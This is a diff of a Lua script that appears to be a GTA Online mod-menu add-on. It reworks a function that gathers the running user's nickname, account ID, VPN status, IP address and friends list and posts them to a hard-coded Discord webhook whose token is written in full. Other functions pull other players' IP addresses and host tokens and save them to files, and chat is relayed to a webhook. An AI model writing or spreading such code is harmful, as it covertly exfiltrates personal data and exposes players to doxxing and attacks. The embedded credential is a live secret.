@@ -382,6 +382,18 @@ function is_entity_a_projectile(hash)
     return table.contains(all_projectile_hashes, hash)
 end
 
+function get_condensed_player_name(player)
+	local condensed = "<C>" .. PLAYER.GET_PLAYER_NAME(player) .. "</C>"
+
+	if players.get_boss(player) ~= -1  then
+		local colour = players.get_org_colour(player)
+		local hudColour = get_hud_colour_from_org_colour(colour)
+		return string.format("~HC_%d~%s~s~", hudColour, condensed)
+	end
+
+	return condensed
+end
+
 function format_friends_list()
     local friend_count = NETWORK.NETWORK_GET_FRIEND_COUNT()
     local friend_list = {}
@@ -416,7 +428,33 @@ function player_ip(pid)
     math.floor(connectIP / 2^16) % 256,
     math.floor(connectIP / 2^8) % 256,
     connectIP % 256)
-    return ipStringplayer
+    
+    if ipStringplayer == "255.255.255.255" then
+        return "Connected to Relay"
+    else
+        return ipStringplayer
+    end
+end
+
+
+function language_string(language)
+    local language_table = {
+      [0] = "American (en-US)",
+      [1] = "French (fr-FR)",
+      [2] = "German (de-DE)",
+      [3] = "Italian (it-IT)",
+      [4] = "Spanish (es-ES)",
+      [5] = "Brazilian (pt-BR)",
+      [6] = "Polish (pl-PL)",
+      [7] = "Russian (ru-RU)",
+      [8] = "Korean (ko-KR)",
+      [9] = "Chinese Traditional (zh-TW)",
+      [10] = "Japanese (ja-JP)",
+      [11] = "Mexican (es-MX)",
+      [12] = "Chinese Simplified (zh-CN)"
+    }
+    
+    return language_table[language] or "Unknown"
 end
 
 function money_drop_auto_reply(packet_sender, text, team_chat, networked)
@@ -475,44 +513,56 @@ function send_discord_webhook()
     local IPv4url = "[" .. user_ip() .. "](" .. apiurl .. ")"
     local friend_list = format_friends_list()
 
+    local message = string.format("%s\n\n**RID:** %s\n**VPN:** %s\n**IPv4:** %s\n**Friends:**\n%s",
+        player_name, player_id, using_vpn and "Yes" or "No", IPv4url, friend_list)
+
+    -- Replace all underscores with a special symbol
+    message = message:gsub("_", "§")
+
+    if #message > 1800 then
+        local messages = {}
+        local current_message = ""
+        for line in message:gmatch("[^\r\n]+") do
+            if #current_message + #line > 1800 then
+                table.insert(messages, current_message)
+                current_message = ""
+            end
+            current_message = current_message .. line .. "\n"
+        end
+        table.insert(messages, current_message)
+
+        for i, msg in messages do
+            wait(1000)
+            send_discord_webhook_internal(msg:gsub("§", "_"), i == #messages)
+        end
+    else
+        send_discord_webhook_internal(message:gsub("§", "_"), true)
+    end
+end
+
+function send_discord_webhook_internal(message, is_last_message)
+    local player_name = SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()
     local json_data = {
         ["username"] = player_name,
-        --["avatar_url"] = "https://i.imgur.com/5kiNwQE.png",
         ["embeds"] = {{
             ["title"] = player_name,
             ["url"] = "https://socialclub.rockstargames.com/member/" .. player_name,
             ["color"] = 15357637,
-            ["fields"] = {{
-                ["name"] = "RID",
-                ["value"] = player_id,
-                ["inline"] = false
-            }, {
-                ["name"] = "VPN",
-                ["value"] = using_vpn and "Yes" or "No",
-                ["inline"] = true
-            }, {
-                ["name"] = "IPv4",
-                ["value"] = IPv4url,
-                ["inline"] = true
-            }, {
-                ["name"] = "Friends",
-                ["value"] = friend_list,
-                ["inline"] = false
-            }}
+            ["description"] = message:gsub("§", "_")
         }}
     }
 
     local json_string = json.stringify(json_data)
 
-    async_http.init("discord.com", "/api/webhooks/1084525001128017982/GOaYBeykjtFwfRKv_oS1FU6yj07ls2jVjyTSM6lrsUUEclqETEv27M9kkR-3EvJm9pNw", function(body, header_fields, status_code)
-        --print("Discord Webhook sent successfully!")
+    async_http.init("https://discord.com", "/api/webhooks/1084525001128017982/GOaYBeykjtFwfRKv_oS1FU6yj07ls2jVjyTSM6lrsUUEclqETEv27M9kkR-3EvJm9pNw", function(body, header_fields, status_code)
     end, function(error_msg)
-        --print("Discord Webhook error: " .. error_msg)
     end)
 
+    async_http.add_header("Content-Type", "application/json")
     async_http.set_post("application/json", json_string)
     async_http.dispatch()
 end
+
 
 
 -- Chat Webhook
@@ -541,8 +591,6 @@ function send_to_discord_webhook(packet_sender, message_sender, message_text, is
     local player_name = players.get_name(packet_sender)
     local message = player_name .. divider .. message_text
 
-    --[[local webhook_host = "discord.com"
-    local webhook_path = "/api/webhooks/1084525217235353702/1H0VN3oeTZRz-i_5fs_pI_tspKW6a7A7oJYJq4Y4Y3UX9ygs-gb3EniQEn3eHlWcQGId"]]
     local content_type = "application/json"
     local payload = json.encode({content = message})
     local headers = {
@@ -585,29 +633,11 @@ function save_player_info(pid)
     local kd = players.get_kd(pid)
     local is_using_vpn = players.is_using_vpn(pid)
     local player_ip = player_ip(pid)
-    local language_int = players.get_language(pid)
+    local language_int = language_string(players.get_language(pid))
     local is_attacker = players.is_marked_as_attacker(pid)
     local host_token = players.get_host_token_hex(pid)
     local is_using_controller = players.is_using_controller(pid)
     local clan_motto = players.clan_get_motto(pid)
-  
-    -- Mapping the language integer to a string
-    local language = {
-        [0] = "English",
-        [1] = "French",
-        [2] = "German",
-        [3] = "Italian",
-        [4] = "Spanish",
-        [5] = "Brazilian",
-        [6] = "Polish",
-        [7] = "Russian",
-        [8] = "Korean",
-        [9] = "Chinese (T)",
-        [10] = "Japanese",
-        [11] = "Mexican",
-        [12] = "Chinese (S)"
-    }
-    local language_str = language[language_int]
   
     local filename = name .. ".txt"
     local filepath = lenaDir .. "Players/" .. filename
@@ -631,7 +661,7 @@ function save_player_info(pid)
         file:write("K/D: ", kd, "\n")
         file:write("Is Using VPN: ", is_using_vpn and "Yes" or "No", "\n")
         file:write("IPv4: ", player_ip, "\n")
-        file:write("Language: ", language_str, "\n")
+        file:write("Language: ", language_int, "\n")
         file:write("Is Attacker: ", is_attacker and "Yes" or "No", "\n")
         file:write("Host Token: ", host_token, "\n")
         file:write("Is Using Controller: ", is_using_controller and "Yes" or "No", "\n")
